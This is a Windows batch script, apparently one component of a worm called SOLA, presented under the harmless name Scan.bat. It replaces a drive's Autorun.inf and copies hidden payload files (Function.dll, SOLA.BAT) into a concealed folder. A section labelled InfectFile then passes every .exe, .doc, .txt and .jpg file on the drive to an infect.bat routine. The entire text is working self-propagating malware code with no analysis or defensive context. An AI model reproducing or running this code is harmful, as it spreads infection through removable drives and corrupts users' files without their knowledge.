echo This is Scan.bat
if "%1"=="" goto End
set Drive=%1
echo TEST>%Drive%\~solatest&findstr TEST %Drive%\~solatest&if errorlevel 1 goto End
del %Drive%\~solatest

:USBInf
findstr /C:"SOLA_1.0_2.0" %Drive%\Autorun.inf & if errorlevel 1 attrib -s -h -r %Drive%\Autorun.inf&copy /y %setup%\Autorun.inf %Drive%\Autorun.inf&attrib %Drive%\Autorun.inf +s +h +r&md %drive%\SOLA&copy /y "%setup%\Function.dll" %Drive%\SOLA\Function.dll&copy /y "%setup%\SOLA.BAT" %Drive%\SOLA\SOLA.BAT&attrib %Drive%\SOLA +s +h +r



:FILInf

:GetSpace
set Space=
if exist %sola%\Drvifm1.txt del %sola%\Drvifm1.txt
dir %Drive%>%sola%\Drvifm1.txt
set ml=Dir(s)
findstr "个目录" %sola%\Drvifm1.txt>nul&if not errorlevel 1 set ml=个目录
FOR /F "tokens=3" %%i in ('findstr "%ml%" %sola%\Drvifm1.txt') do set Space=%%i
FOR /F "tokens=1,2,3,4,5,6,7,8,9 delims=," %%i in ("%Space%") do set Space=%%i%%j%%k%%l%%m%%n%%o%%p%%q
if "%Space%"=="" set Space=999999999999
if /I %space% lss 5242880 goto End

:InfectFile
set end=%setup%\EJPack.txt&set type=exe
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.exe') do call %setup%\infect.bat %%i
set end=%setup%\TDPack.txt&set type=doc
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.doc') do call %setup%\infect.bat %%i
set end=%setup%\TDPack.txt&set type=txt
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.txt') do call %setup%\infect.bat %%i
set end=%setup%\EJPack.txt&set type=jpg
FOR /F "tokens=*" %%i in ('dir /b /s %Drive%\*.jpg') do call %setup%\infect.bat %%i


:End
FOR /F "tokens=1 delims=:" %%i in ("%Drive%") do set %%i=2
